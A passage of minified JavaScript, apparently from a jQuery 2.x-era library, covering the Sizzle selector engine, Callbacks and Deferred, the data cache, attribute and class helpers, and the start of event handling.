t=H.createElement("input");t.setAttribute("type","hidden"),e.appendChild(t).setAttribute("t",""),e.querySelectorAll("[t^='']").length&&P.push("[*^$]="+st+"*(?:''|\"\")"),e.querySelectorAll(":enabled").length||P.push(":enabled",":disabled"),e.querySelectorAll("*,:x"),P.push(",.*:")})),(I.matchesSelector=n(R=O.webkitMatchesSelector||O.mozMatchesSelector||O.oMatchesSelector||O.msMatchesSelector))&&o(function(e){I.disconnectedMatch=R.call(e,"div"),R.call(e,"[s!='']:x"),M.push("!=",lt)}),P=P.length&&RegExp(P.join("|")),M=M.length&&RegExp(M.join("|")),W=n(O.contains)||O.compareDocumentPosition?function(e,t){var n=9===e.nodeType?e.documentElement:e,r=t&&t.parentNode;return e===r||!(!r||1!==r.nodeType||!(n.contains?n.contains(r):e.compareDocumentPosition&&16&e.compareDocumentPosition(r)))}:function(e,t){if(t)for(;t=t.parentNode;)if(t===e)return!0;return!1},G=O.compareDocumentPosition?function(e,t){if(e===t)return V=!0,0;var n=t.compareDocumentPosition&&e.compareDocumentPosition&&e.compareDocumentPosition(t);return n?1&n||!I.sortDetached&&t.compareDocumentPosition(e)===n?e===r||W($,e)?-1:t===r||W($,t)?1:L?rt.call(L,e)-rt.call(L,t):0:4&n?-1:1:e.compareDocumentPosition?-1:1}:function(e,t){var n,i=0,o=e.parentNode,s=t.parentNode,u=[e],c=[t];if(e===t)return V=!0,0;if(!o||!s)return e===r?-1:t===r?1:o?-1:s?1:L?rt.call(L,e)-rt.call(L,t):0;if(o===s)return a(e,t);for(n=e;n=n.parentNode;)u.unshift(n);for(n=t;n=n.parentNode;)c.unshift(n);for(;u[i]===c[i];)i++;return i?a(u[i],c[i]):u[i]===$?-1:c[i]===$?1:0},H):H},s.matches=function(e,t){return s(e,null,null,t)},s.matchesSelector=function(e,t){if((e.ownerDocument||e)!==H&&q(e),t=t.replace(gt,"='$1']"),!(!I.matchesSelector||!F||M&&M.test(t)||P&&P.test(t)))try{var n=R.call(e,t);if(n||I.disconnectedMatch||e.document&&11!==e.document.nodeType)return n}catch(r){}return s(t,H,null,[e]).length>0},s.contains=function(e,t){return(e.ownerDocument||e)!==H&&q(e),W(e,t)},s.attr=function(e,n){(e.ownerDocument||e)!==H&&q(e);var r=E.attrHandle[n.toLowerCase()],i=r&&r(e,n,!F);return i===t?I.attributes||!F?e.getAttribute(n):(i=e.getAttributeNode(n))&&i.specified?i.value:null:i},s.error=function(e){throw Error("Syntax error, unrecognized expression: "+e)},s.uniqueSort=function(e){var t,n=[],r=0,i=0;if(V=!I.detectDuplicates,L=!I.sortStable&&e.slice(0),e.sort(G),V){for(;t=e[i++];)t===e[i]&&(r=n.push(i));for(;r--;)e.splice(n[r],1)}return e},S=s.getText=function(e){var t,n="",r=0,i=e.nodeType;if(i){if(1===i||9===i||11===i){if("string"==typeof e.textContent)return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)n+=S(e)}else if(3===i||4===i)return e.nodeValue}else for(;t=e[r];r++)n+=S(t);return n},E=s.selectors={cacheLength:50,createPseudo:i,match:vt,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){return e[1]=e[1].replace(Nt,kt),e[3]=(e[4]||e[5]||"").replace(Nt,kt),"~="===e[2]&&(e[3]=" "+e[3]+" "),e.slice(0,4)},CHILD:function(e){return e[1]=e[1].toLowerCase(),"nth"===e[1].slice(0,3)?(e[3]||s.error(e[0]),e[4]=+(e[4]?e[5]+(e[6]||1):2*("even"===e[3]||"odd"===e[3])),e[5]=+(e[7]+e[8]||"odd"===e[3])):e[3]&&s.error(e[0]),e},PSEUDO:function(e){var t,n=!e[5]&&e[2];return vt.CHILD.test(e[0])?null:(e[4]?e[2]=e[4]:n&&mt.test(n)&&(t=d(n,!0))&&(t=n.indexOf(")",n.length-t)-n.length)&&(e[0]=e[0].slice(0,t),e[2]=n.slice(0,t)),e.slice(0,3))}},filter:{TAG:function(e){var t=e.replace(Nt,kt).toLowerCase();return"*"===e?function(){return!0}:function(e){return e.nodeName&&e.nodeName.toLowerCase()===t}},CLASS:function(e){var t=X[e+" "];return t||(t=RegExp("(^|"+st+")"+e+"("+st+"|$)"))&&X(e,function(e){return t.test(e.className||typeof e.getAttribute!==J&&e.getAttribute("class")||"")})},ATTR:function(e,t,n){return function(r){var i=s.attr(r,e);return null==i?"!="===t:t?(i+="","="===t?i===n:"!="===t?i!==n:"^="===t?n&&0===i.indexOf(n):"*="===t?n&&i.indexOf(n)>-1:"$="===t?n&&i.slice(-n.length)===n:"~="===t?(" "+i+" ").indexOf(n)>-1:"|="===t?i===n||i.slice(0,n.length+1)===n+"-":!1):!0}},CHILD:function(e,t,n,r,i){var o="nth"!==e.slice(0,3),s="last"!==e.slice(-4),a="of-type"===t;return 1===r&&0===i?function(e){return!!e.parentNode}:function(t,n,u){var c,l,f,p,d,h,g=o!==s?"nextSibling":"previousSibling",m=t.parentNode,y=a&&t.nodeName.toLowerCase(),v=!u&&!a;if(m){if(o){for(;g;){for(f=t;f=f[g];)if(a?f.nodeName.toLowerCase()===y:1===f.nodeType)return!1;h=g="only"===e&&!h&&"nextSibling"}return!0}if(h=[s?m.firstChild:m.lastChild],s&&v){for(l=m[B]||(m[B]={}),c=l[e]||[],d=c[0]===z&&c[1],p=c[0]===z&&c[2],f=d&&m.childNodes[d];f=++d&&f&&f[g]||(p=d=0)||h.pop();)if(1===f.nodeType&&++p&&f===t){l[e]=[z,d,p];break}}else if(v&&(c=(t[B]||(t[B]={}))[e])&&c[0]===z)p=c[1];else for(;(f=++d&&f&&f[g]||(p=d=0)||h.pop())&&((a?f.nodeName.toLowerCase()!==y:1!==f.nodeType)||!++p||(v&&((f[B]||(f[B]={}))[e]=[z,p]),f!==t)););return p-=i,p===r||0===p%r&&p/r>=0}}},PSEUDO:function(e,t){var n,r=E.pseudos[e]||E.setFilters[e.toLowerCase()]||s.error("unsupported pseudo: "+e);return r[B]?r(t):r.length>1?(n=[e,e,"",t],E.setFilters.hasOwnProperty(e.toLowerCase())?i(function(e,n){for(var i,o=r(e,t),s=o.length;s--;)i=rt.call(e,o[s]),e[i]=!(n[i]=o[s])}):function(e){return r(e,0,n)}):r}},pseudos:{not:i(function(e){var t=[],n=[],r=D(e.replace(ft,"$1"));return r[B]?i(function(e,t,n,i){for(var o,s=r(e,null,i,[]),a=e.length;a--;)(o=s[a])&&(e[a]=!(t[a]=o))}):function(e,i,o){return t[0]=e,r(t,null,o,n),!n.pop()}}),has:i(function(e){return function(t){return s(e,t).length>0}}),contains:i(function(e){return function(t){return(t.textContent||t.innerText||S(t)).indexOf(e)>-1}}),lang:i(function(e){return yt.test(e||"")||s.error("unsupported lang: "+e),e=e.replace(Nt,kt).toLowerCase(),function(t){var n;do if(n=F?t.lang:t.getAttribute("xml:lang")||t.getAttribute("lang"))return n=n.toLowerCase(),n===e||0===n.indexOf(e+"-");while((t=t.parentNode)&&1===t.nodeType);return!1}}),target:function(t){var n=e.location&&e.location.hash;return n&&n.slice(1)===t.id},root:function(e){return e===O},focus:function(e){return e===H.activeElement&&(!H.hasFocus||H.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:function(e){return e.disabled===!1},disabled:function(e){return e.disabled===!0},checked:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&!!e.checked||"option"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,e.selected===!0},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeName>"@"||3===e.nodeType||4===e.nodeType)return!1;return!0},parent:function(e){return!E.pseudos.empty(e)},header:function(e){return Tt.test(e.nodeName)},input:function(e){return wt.test(e.nodeName)},button:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&"button"===e.type||"button"===t},text:function(e){var t;return"input"===e.nodeName.toLowerCase()&&"text"===e.type&&(null==(t=e.getAttribute("type"))||t.toLowerCase()===e.type)},first:p(function(){return[0]}),last:p(function(e,t){return[t-1]}),eq:p(function(e,t,n){return[0>n?n+t:n]}),even:p(function(e,t){for(var n=0;t>n;n+=2)e.push(n);return e}),odd:p(function(e,t){for(var n=1;t>n;n+=2)e.push(n);return e}),lt:p(function(e,t,n){for(var r=0>n?n+t:n;--r>=0;)e.push(r);return e}),gt:p(function(e,t,n){for(var r=0>n?n+t:n;t>++r;)e.push(r);return e})}};for(N in{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})E.pseudos[N]=l(N);for(N in{submit:!0,reset:!0})E.pseudos[N]=f(N);D=s.compile=function(e,t){var n,r=[],i=[],o=Y[e+" "];if(!o){for(t||(t=d(e)),n=t.length;n--;)o=x(t[n]),o[B]?r.push(o):i.push(o);o=Y(e,b(i,r))}return o},E.pseudos.nth=E.pseudos.eq,C.prototype=E.filters=E.pseudos,E.setFilters=new C,I.sortStable=B.split("").sort(G).join("")===B,q(),[0,0].sort(G),I.detectDuplicates=V,o(function(e){if(e.innerHTML="<a href='#'></a>","#"!==e.firstChild.getAttribute("href"))for(var t="type|href|src|height|width".split("|"),n=t.length;n--;)E.attrHandle[t[n]]=c}),o(function(e){if(null!=e.getAttribute("disabled"))for(var t=it.split("|"),n=t.length;n--;)E.attrHandle[t[n]]=u}),ot.find=s,ot.expr=s.selectors,ot.expr[":"]=ot.expr.pseudos,ot.unique=s.uniqueSort,ot.text=s.getText,ot.isXMLDoc=s.isXML,ot.contains=s.contains}(e);var ht={};ot.Callbacks=function(e){e="string"==typeof e?ht[e]||r(e):ot.extend({},e);var n,i,o,s,a,u,c=[],l=!e.once&&[],f=function(t){for(n=e.memory&&t,i=!0,u=s||0,s=0,a=c.length,o=!0;c&&a>u;u++)if(c[u].apply(t[0],t[1])===!1&&e.stopOnFalse){n=!1;break}o=!1,c&&(l?l.length&&f(l.shift()):n?c=[]:p.disable())},p={add:function(){if(c){var t=c.length;(function r(t){ot.each(t,function(t,n){var i=ot.type(n);"function"===i?e.unique&&p.has(n)||c.push(n):n&&n.length&&"string"!==i&&r(n)})})(arguments),o?a=c.length:n&&(s=t,f(n))}return this},remove:function(){return c&&ot.each(arguments,function(e,t){for(var n;(n=ot.inArray(t,c,n))>-1;)c.splice(n,1),o&&(a>=n&&a--,u>=n&&u--)}),this},has:function(e){return e?ot.inArray(e,c)>-1:!(!c||!c.length)},empty:function(){return c=[],a=0,this},disable:function(){return c=l=n=t,this},disabled:function(){return!c},lock:function(){return l=t,n||p.disable(),this},locked:function(){return!l},fireWith:function(e,t){return t=t||[],t=[e,t.slice?t.slice():t],!c||i&&!l||(o?l.push(t):f(t)),this},fire:function(){return p.fireWith(this,arguments),this},fired:function(){return!!i}};return p},ot.extend({Deferred:function(e){var t=[["resolve","done",ot.Callbacks("once memory"),"resolved"],["reject","fail",ot.Callbacks("once memory"),"rejected"],["notify","progress",ot.Callbacks("memory")]],n="pending",r={state:function(){return n},always:function(){return i.done(arguments).fail(arguments),this},then:function(){var e=arguments;return ot.Deferred(function(n){ot.each(t,function(t,o){var s=o[0],a=ot.isFunction(e[t])&&e[t];i[o[1]](function(){var e=a&&a.apply(this,arguments);e&&ot.isFunction(e.promise)?e.promise().done(n.resolve).fail(n.reject).progress(n.notify):n[s+"With"](this===r?n.promise():this,a?[e]:arguments)})}),e=null}).promise()},promise:function(e){return null!=e?ot.extend(e,r):r}},i={};return r.pipe=r.then,ot.each(t,function(e,o){var s=o[2],a=o[3];r[o[1]]=s.add,a&&s.add(function(){n=a},t[1^e][2].disable,t[2][2].lock),i[o[0]]=function(){return i[o[0]+"With"](this===i?r:this,arguments),this},i[o[0]+"With"]=s.fireWith}),r.promise(i),e&&e.call(i,i),i},when:function(e){var t,n,r,i=0,o=et.call(arguments),s=o.length,a=1!==s||e&&ot.isFunction(e.promise)?s:0,u=1===a?e:ot.Deferred(),c=function(e,n,r){return function(i){n[e]=this,r[e]=arguments.length>1?et.call(arguments):i,r===t?u.notifyWith(n,r):--a||u.resolveWith(n,r)}};if(s>1)for(t=Array(s),n=Array(s),r=Array(s);s>i;i++)o[i]&&ot.isFunction(o[i].promise)?o[i].promise().done(c(i,r,o)).fail(u.reject).progress(c(i,n,t)):--a;return a||u.resolveWith(r,o),u.promise()}}),ot.support=function(t){var n=X.createElement("input"),r=X.createDocumentFragment(),i=X.createElement("div"),o=X.createElement("select"),s=o.appendChild(X.createElement("option"));return n.type?(n.type="checkbox",t.checkOn=""!==n.value,t.optSelected=s.selected,t.reliableMarginRight=!0,t.boxSizingReliable=!0,t.pixelPosition=!1,n.checked=!0,t.noCloneChecked=n.cloneNode(!0).checked,o.disabled=!0,t.optDisabled=!s.disabled,n=X.createElement("input"),n.value="t",n.type="radio",t.radioValue="t"===n.value,n.setAttribute("checked","t"),n.setAttribute("name","t"),r.appendChild(n),t.checkClone=r.cloneNode(!0).cloneNode(!0).lastChild.checked,t.focusinBubbles="onfocusin"in e,i.style.backgroundClip="content-box",i.cloneNode(!0).style.backgroundClip="",t.clearCloneStyle="content-box"===i.style.backgroundClip,ot(function(){var n,r,o="padding:0;margin:0;border:0;display:block;-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box",s=X.getElementsByTagName("body")[0];s&&(n=X.createElement("div"),n.style.cssText="border:0;width:0;height:0;position:absolute;top:0;left:-9999px;margin-top:1px",s.appendChild(n).appendChild(i),i.innerHTML="",i.style.cssText="-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:1px;border:1px;display:block;width:4px;margin-top:1%;position:absolute;top:1%",ot.swap(s,null!=s.style.zoom?{zoom:1}:{},function(){t.boxSizing=4===i.offsetWidth}),e.getComputedStyle&&(t.pixelPosition="1%"!==(e.getComputedStyle(i,null)||{}).top,t.boxSizingReliable="4px"===(e.getComputedStyle(i,null)||{width:"4px"}).width,r=i.appendChild(X.createElement("div")),r.style.cssText=i.style.cssText=o,r.style.marginRight=r.style.width="0",i.style.width="1px",t.reliableMarginRight=!parseFloat((e.getComputedStyle(r,null)||{}).marginRight)),s.removeChild(n))}),t):t}({});var gt,mt,yt=/(?:\{[\s\S]*\}|\[[\s\S]*\])$/,vt=/([A-Z])/g;i.uid=1,i.accepts=function(e){return e.nodeType?1===e.nodeType||9===e.nodeType:!0},i.prototype={key:function(e){if(!i.accepts(e))return 0;var t={},n=e[this.expando];if(!n){n=i.uid++;try{t[this.expando]={value:n},Object.defineProperties(e,t)}catch(r){t[this.expando]=n,ot.extend(e,t)}}return this.cache[n]||(this.cache[n]={}),n},set:function(e,t,n){var r,i=this.key(e),o=this.cache[i];if("string"==typeof t)o[t]=n;else if(ot.isEmptyObject(o))this.cache[i]=t;else for(r in t)o[r]=t[r]},get:function(e,n){var r=this.cache[this.key(e)];return n===t?r:r[n]},access:function(e,n,r){return n===t||n&&"string"==typeof n&&r===t?this.get(e,n):(this.set(e,n,r),r!==t?r:n)},remove:function(e,n){var r,i,o=this.key(e),s=this.cache[o];if(n===t)this.cache[o]={};else{ot.isArray(n)?i=n.concat(n.map(ot.camelCase)):n in s?i=[n]:(i=ot.camelCase(n),i=i in s?[i]:i.match(at)||[]),r=i.length;for(;r--;)delete s[i[r]]}},hasData:function(e){return!ot.isEmptyObject(this.cache[e[this.expando]]||{})},discard:function(e){delete this.cache[this.key(e)]}},gt=new i,mt=new i,ot.extend({acceptData:i.accepts,hasData:function(e){return gt.hasData(e)||mt.hasData(e)},data:function(e,t,n){return gt.access(e,t,n)},removeData:function(e,t){gt.remove(e,t)},_data:function(e,t,n){return mt.access(e,t,n)},_removeData:function(e,t){mt.remove(e,t)}}),ot.fn.extend({data:function(e,n){var r,i,s=this[0],a=0,u=null;if(e===t){if(this.length&&(u=gt.get(s),1===s.nodeType&&!mt.get(s,"hasDataAttrs"))){for(r=s.attributes;r.length>a;a++)i=r[a].name,0===i.indexOf("data-")&&(i=ot.camelCase(i.substring(5)),o(s,i,u[i]));mt.set(s,"hasDataAttrs",!0)}return u}return"object"==typeof e?this.each(function(){gt.set(this,e)}):ot.access(this,function(n){var r,i=ot.camelCase(e);if(s&&n===t){if(r=gt.get(s,e),r!==t)return r;if(r=gt.get(s,i),r!==t)return r;if(r=o(s,i,t),r!==t)return r}else this.each(function(){var r=gt.get(this,i);gt.set(this,i,n),-1!==e.indexOf("-")&&r!==t&&gt.set(this,e,n)})},null,n,arguments.length>1,null,!0)},removeData:function(e){return this.each(function(){gt.remove(this,e)})}}),ot.extend({queue:function(e,n,r){var i;return e?(n=(n||"fx")+"queue",i=mt.get(e,n),r&&(!i||ot.isArray(r)?i=mt.access(e,n,ot.makeArray(r)):i.push(r)),i||[]):t},dequeue:function(e,t){t=t||"fx";var n=ot.queue(e,t),r=n.length,i=n.shift(),o=ot._queueHooks(e,t),s=function(){ot.dequeue(e,t)};"inprogress"===i&&(i=n.shift(),r--),o.cur=i,i&&("fx"===t&&n.unshift("inprogress"),delete o.stop,i.call(e,s,o)),!r&&o&&o.empty.fire()},_queueHooks:function(e,t){var n=t+"queueHooks";return mt.get(e,n)||mt.access(e,n,{empty:ot.Callbacks("once memory").add(function(){mt.remove(e,[t+"queue",n])})})}}),ot.fn.extend({queue:function(e,n){var r=2;return"string"!=typeof e&&(n=e,e="fx",r--),r>arguments.length?ot.queue(this[0],e):n===t?this:this.each(function(){var t=ot.queue(this,e,n);ot._queueHooks(this,e),"fx"===e&&"inprogress"!==t[0]&&ot.dequeue(this,e)})},dequeue:function(e){return this.each(function(){ot.dequeue(this,e)})},delay:function(e,t){return e=ot.fx?ot.fx.speeds[e]||e:e,t=t||"fx",this.queue(t,function(t,n){var r=setTimeout(t,e);n.stop=function(){clearTimeout(r)}})},clearQueue:function(e){return this.queue(e||"fx",[])},promise:function(e,n){var r,i=1,o=ot.Deferred(),s=this,a=this.length,u=function(){--i||o.resolveWith(s,[s])};for("string"!=typeof e&&(n=e,e=t),e=e||"fx";a--;)r=mt.get(s[a],e+"queueHooks"),r&&r.empty&&(i++,r.empty.add(u));return u(),o.promise(n)}});var xt,bt,wt=/[\t\r\n]/g,Tt=/\r/g,Ct=/^(?:input|select|textarea|button)$/i;ot.fn.extend({attr:function(e,t){return ot.access(this,ot.attr,e,t,arguments.length>1)},removeAttr:function(e){return this.each(function(){ot.removeAttr(this,e)})},prop:function(e,t){return ot.access(this,ot.prop,e,t,arguments.length>1)},removeProp:function(e){return this.each(function(){delete this[ot.propFix[e]||e]})},addClass:function(e){var t,n,r,i,o,s=0,a=this.length,u="string"==typeof e&&e;if(ot.isFunction(e))return this.each(function(t){ot(this).addClass(e.call(this,t,this.className))});if(u)for(t=(e||"").match(at)||[];a>s;s++)if(n=this[s],r=1===n.nodeType&&(n.className?(" "+n.className+" ").replace(wt," "):" ")){for(o=0;i=t[o++];)0>r.indexOf(" "+i+" ")&&(r+=i+" ");n.className=ot.trim(r)}return this},removeClass:function(e){var t,n,r,i,o,s=0,a=this.length,u=0===arguments.length||"string"==typeof e&&e;if(ot.isFunction(e))return this.each(function(t){ot(this).removeClass(e.call(this,t,this.className))});if(u)for(t=(e||"").match(at)||[];a>s;s++)if(n=this[s],r=1===n.nodeType&&(n.className?(" "+n.className+" ").replace(wt," "):"")){for(o=0;i=t[o++];)for(;r.indexOf(" "+i+" ")>=0;)r=r.replace(" "+i+" "," ");n.className=e?ot.trim(r):""}return this},toggleClass:function(e,t){var n=typeof e,r="boolean"==typeof t;return ot.isFunction(e)?this.each(function(n){ot(this).toggleClass(e.call(this,n,this.className,t),t)}):this.each(function(){if("string"===n)for(var i,o=0,s=ot(this),a=t,u=e.match(at)||[];i=u[o++];)a=r?a:!s.hasClass(i),s[a?"addClass":"removeClass"](i);else(n===z||"boolean"===n)&&(this.className&&mt.set(this,"__className__",this.className),this.className=this.className||e===!1?"":mt.get(this,"__className__")||"")})},hasClass:function(e){for(var t=" "+e+" ",n=0,r=this.length;r>n;n++)if(1===this[n].nodeType&&(" "+this[n].className+" ").replace(wt," ").indexOf(t)>=0)return!0;return!1},val:function(e){var n,r,i,o=this[0];{if(arguments.length)return i=ot.isFunction(e),this.each(function(r){var o,s=ot(this);1===this.nodeType&&(o=i?e.call(this,r,s.val()):e,null==o?o="":"number"==typeof o?o+="":ot.isArray(o)&&(o=ot.map(o,function(e){return null==e?"":e+""})),n=ot.valHooks[this.type]||ot.valHooks[this.nodeName.toLowerCase()],n&&"set"in n&&n.set(this,o,"value")!==t||(this.value=o))});if(o)return n=ot.valHooks[o.type]||ot.valHooks[o.nodeName.toLowerCase()],n&&"get"in n&&(r=n.get(o,"value"))!==t?r:(r=o.value,"string"==typeof r?r.replace(Tt,""):null==r?"":r)}}}),ot.extend({valHooks:{option:{get:function(e){var t=e.attributes.value;return!t||t.specified?e.value:e.text}},select:{get:function(e){for(var t,n,r=e.options,i=e.selectedIndex,o="select-one"===e.type||0>i,s=o?null:[],a=o?i+1:r.length,u=0>i?a:o?i:0;a>u;u++)if(n=r[u],!(!n.selected&&u!==i||(ot.support.optDisabled?n.disabled:null!==n.getAttribute("disabled"))||n.parentNode.disabled&&ot.nodeName(n.parentNode,"optgroup"))){if(t=ot(n).val(),o)return t;s.push(t)}return s},set:function(e,t){for(var n,r,i=e.options,o=ot.makeArray(t),s=i.length;s--;)r=i[s],(r.selected=ot.inArray(ot(r).val(),o)>=0)&&(n=!0);return n||(e.selectedIndex=-1),o}}},attr:function(e,n,r){var i,o,s=e.nodeType;if(e&&3!==s&&8!==s&&2!==s)return typeof e.getAttribute===z?ot.prop(e,n,r):(1===s&&ot.isXMLDoc(e)||(n=n.toLowerCase(),i=ot.attrHooks[n]||(ot.expr.match.boolean.test(n)?bt:xt)),r===t?i&&"get"in i&&null!==(o=i.get(e,n))?o:(o=ot.find.attr(e,n),null==o?t:o):null!==r?i&&"set"in i&&(o=i.set(e,r,n))!==t?o:(e.setAttribute(n,r+""),r):(ot.removeAttr(e,n),t))},removeAttr:function(e,t){var n,r,i=0,o=t&&t.match(at);if(o&&1===e.nodeType)for(;n=o[i++];)r=ot.propFix[n]||n,ot.expr.match.boolean.test(n)&&(e[r]=!1),e.removeAttribute(n)},attrHooks:{type:{set:function(e,t){if(!ot.support.radioValue&&"radio"===t&&ot.nodeName(e,"input")){var n=e.value;return e.setAttribute("type",t),n&&(e.value=n),t}}}},propFix:{"for":"htmlFor","class":"className"},prop:function(e,n,r){var i,o,s,a=e.nodeType;if(e&&3!==a&&8!==a&&2!==a)return s=1!==a||!ot.isXMLDoc(e),s&&(n=ot.propFix[n]||n,o=ot.propHooks[n]),r!==t?o&&"set"in o&&(i=o.set(e,r,n))!==t?i:e[n]=r:o&&"get"in o&&null!==(i=o.get(e,n))?i:e[n]},propHooks:{tabIndex:{get:function(e){return e.hasAttribute("tabindex")||Ct.test(e.nodeName)||e.href?e.tabIndex:-1}}}}),bt={set:function(e,t,n){return t===!1?ot.removeAttr(e,n):e.setAttribute(n,n),n}},ot.each(ot.expr.match.boolean.source.match(/\w+/g),function(e,n){var r=ot.expr.attrHandle[n]||ot.find.attr;ot.expr.attrHandle[n]=function(e,n,i){var o=ot.expr.attrHandle[n],s=i?t:(ot.expr.attrHandle[n]=t)!=r(e,n,i)?n.toLowerCase():null;return ot.expr.attrHandle[n]=o,s}}),ot.support.optSelected||(ot.propHooks.selected={get:function(e){var t=e.parentNode;return t&&t.parentNode&&t.parentNode.selectedIndex,null}}),ot.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){ot.propFix[this.toLowerCase()]=this}),ot.each(["radio","checkbox"],function(){ot.valHooks[this]={set:function(e,n){return ot.isArray(n)?e.checked=ot.inArray(ot(e).val(),n)>=0:t}},ot.support.checkOn||(ot.valHooks[this].get=function(e){return null===e.getAttribute("value")?"on":e.value})});var Nt=/^key/,kt=/^(?:mouse|contextmenu)|click/,Et=/^(?:focusinfocus|focusoutblur)$/,St=/^([^.]*)(?:\.(.+)|)$/;ot.event={global:{},add:function(e,n,r,i,o){var s,a,u,c,l,f,p,d,h,g,m,y=mt.get(e);if(y){for(r.handler&&(s=r,r=s.handler,o=s.selector),r.guid||(r.guid=ot.guid++),(c=y.events)||(c=y.events={}),(a=y.handle)||(a=y.handle=function(e){return typeof ot===z||e&&ot.event.triggered===e.type?t:ot.event.dispatch.apply(a.elem,arguments)},a.elem=e),n=(n||"").match(at)||[""],l=n.length;l--;)u=St.exec(n[l])||[],h=m=u[1],g=(u[2]||"").split(".").sort(),h&&(p=ot.event.special[h]||{},h=(o?p.delegateType:p.bindType)||h,p=ot.event.special[h]||{},f=ot.extend({type:h,origType:m,data:i,handler:r,guid:r.guid,selector:o,needsContext:o&&ot.expr.match.needsContext.test(o),namespace:g.join(".")},s),(d=c[h])||(d=c[h]=[],d.delegateCount=0,p.setup&&p.setup.call(e,i,g,a)!==!1||e.addEventListener&&e.addEventListener(h,a,!1)),p.add&&(p.add.call(e,f),f.handler.guid||(f.handler.guid=r.guid)),o?d.splice(d.delegateCount++,0,f):d.push(f),ot.event.global[h]=!0);e=null}},remove:function(e,t,n,r,i){var o,s,a,u,c,l,f,p,d,h,g,m=mt.hasData(e)&&mt.get(e);if(m&&(u=m.events)){for(t=(t||"").match(at)||[""],c=t.length;c--;)if(a=St.exec(t[c])||[],d=g=a[1],h=(a[2]||"").split(".").sort(),d){for(f=ot.event.special[d]||{},d=(r?f.delegateType:f.bindType)||d,p=u[d]||[],a=a[2]&&RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"),s=o=p.length;o--;)l=p[o],!i&&g!==l.origType||n&&n.guid!==l.guid||a&&!a.test(l.namespace)||r&&r!==l.selector&&("**"!==r||!l.selector)||(p.splice(o,1),l.selector&&p.delegateCount--,f.remove&&f.remove.call(e,l));s&&!p.length&&(f.teardown&&f.teardown.call(e,h,m.handle)!==!1||ot.removeEvent(e,d,m.handle),delete u[d])}else for(d in u)ot.event.remove(e,d+t[c],n,r,!0);ot.isEmptyObject(u)&&(delete m.handle,mt.remove(e,"events"))}},trigger:function(n,r,i,o){var s,a,u,c,l,f,p,d=[i||X],h=rt.call(n,"type")?n.type:n,g=rt.call(n,"namespace")?n.namespace.split("."):[];if(a=u=i=i||X,3!==i.nodeType&&8!==i.nodeType&&!Et.test(h+ot.event.triggered)&&(h.indexOf(".")>=0&&(g=h.split("."),h=g.shift(),g.sort()),l=0>h.indexOf(":")&&"on"+h,n=n[ot.expando]?n:new ot.Event(h,"object"==typeof n&&n),n.isTrigger=o?2:3,n.namespace=g.join("."),n.namespace_re=n.namespace?RegExp("(^|\\.)"+g.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,n.result=t,n.target||(n.target=i),r=null==r?[n]:ot.makeArray(r,[n]),p=ot.event.special[h]||{},o||!p.trigger||p.trigger.apply(i,r)!==!1)){if(!o&&!p.noBubble&&!ot.isWindow(i)){for(c=p.delegateType||h,Et.test(c+h)||(a=a.parentNode);a;a=a.parentNode)d.push(a),u=a;u===(i.ownerDocument||X)&&d.push(u.defaultView||u.parentWindow||e)}for(s=0;(a=d[s++])&&!n.isPropagationStopped();)n.type=s>1?c:p.bindType||h,f=(mt.get(a,"events")||{})[n.type]&&mt.get(a,"handle"),f&&f.apply(a,r),f=l&&a[l],f&&ot.acceptData(a)&&f.apply&&f.apply(a,r)===!1&&n.preventDefault();return n.type=h,o||n.isDefaultPrevented()||p._default&&p._default.apply(d.pop(),r)!==!1||!ot.acceptData(i)||l&&ot.isFunction(i[h])&&!ot.isWindow(i)&&(u=i[l],u&&(i[l]=null),ot.event.triggered=h,i[h](),ot.event.triggered=t,u&&(i[l]=u)),n.result}},dispatch:function(e){e=ot.event.fix(e);var n,r,i,o,s,a=[],u=et.call(arguments),c=(mt.get(this,"events")||{})[e.type]||[],l=ot.event.special[e.type]||{};if(u[0]=e,e.delegateTarget=this,!l.preDispatch||l.preDispatch.call(this,e)!==!1){for(a=ot.event.handlers.call(this,e,c),n=0;(o=a[n++])&&!e.isPropagationStopped();)for(e.currentTarget=o.elem,r=0;(s=o.handlers[r++])&&!e.isImmediatePropagationStopped();)(!e.namespace_re||e.namespace_re.test(s.namespace))&&(e.handleObj=s,e.data=s.data,i=((ot.event.special[s.origType]||{}).handle||s.handler).apply(o.elem,u),i!==t&&(e.result=i)===!1&&(e.preventDefault(),e.stopPropagation()));return l.postDispatch&&l.postDispatch.call(this,e),e.result}},handlers:function(e,n){var r,i,o,s,a=[],u=n.delegateCount,c=e.target;if(u&&c.nodeType&&(!e.button||"click"!==e.type))for(;c!==this;c=c.parentNode||this)if(c.disabled!==!0||"click"!==e.type){for(i=[],r=0;u>r;r++)s=n[r],o=s.selector+" ",i[o]===t&&(i[o]=s.needsContext?ot(o,this).index(c)>=0:ot.find(o,this,null,[c]).length),i[o]&&i.push(s);i.length&&a.push({elem:c,handlers:i})}return n.length>u&&a.push({elem:this,handlers:n.slice(u)}),a},props:"altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(e,t){return null==e.which&&(e.which=null!=t.charCode?t.charCode:t.keyCode),e}},mouseHooks:{props:"button buttons clientX clientY offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(e,n){var r,i,o,s=n.button;return 